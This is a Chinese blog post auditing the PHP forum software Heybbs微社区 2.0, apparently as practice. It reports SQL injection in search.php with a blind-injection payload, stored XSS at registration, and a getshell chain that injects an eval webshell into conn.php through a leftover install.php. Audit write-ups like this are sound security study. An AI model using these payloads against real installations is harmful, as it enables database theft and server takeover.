---
title: Heybbs微社区 2.0 代码审计
categories: PHP代码审计
---
# 前言
练手 [下载地址 Heybbs微社区 2.0](https://www.mycodes.net/41/10275.htm)

# 前台SQL注入
![](https://img-blog.csdnimg.cn/06ffda37b02d48e3b8cdfd2652de5f7e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
msg.php
![](https://img-blog.csdnimg.cn/e25e39671b0c45729300f531ca19f9e8.png#pic_center)
未过滤直接进行拼接，明显sql注入

<!--more-->
search.php
![](https://img-blog.csdnimg.cn/d01f37bfc5534dffbd54537595bd8d99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
未过滤，payload：`test%' and ascii(substr(database(),1,1))=116#`
拼接后形成：
`select count(*) from msg where content like '%test%' and ascii(substr(database(),1,1))=116#%'`

# 存储xss
用户名注册地方没有任何过滤，注册时直接插xss代码

![](https://img-blog.csdnimg.cn/72882fe821d44f7eaf1f043111f4796d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

加个htmlspecialchars就能修复了

# Getshell
发现安装完成后，install.php没有删除也没有类似校验的install.lock文件

审计install.php发现问题
![](https://img-blog.csdnimg.cn/7b498b9e9a9a4a8a885491576369f9e9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
没有过滤就写入conn.php，数据库账号密码肯定不能出错，那么可以利用上面的sql注入，得到数据库账号密码，创建一个特殊库名，将`$db_name= '");eval($_POST[shell]);#`
![](https://img-blog.csdnimg.cn/6a623cdd70e0419b88b0e0d92e26a173.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
![](https://img-blog.csdnimg.cn/9a6af05c0bfb4e009684d1fcff59ade8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
# 恶意数据库读取文件
如果没有办法获取到数据库账号密码，或者用户设置的是只允许本地登录，那么我们可以利用恶意数据库进行读取文件
![](https://img-blog.csdnimg.cn/928bf7d3c66f4302b5e826961102f941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
![](https://img-blog.csdnimg.cn/82f84955a6614e4a81f01a865d37ba4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)





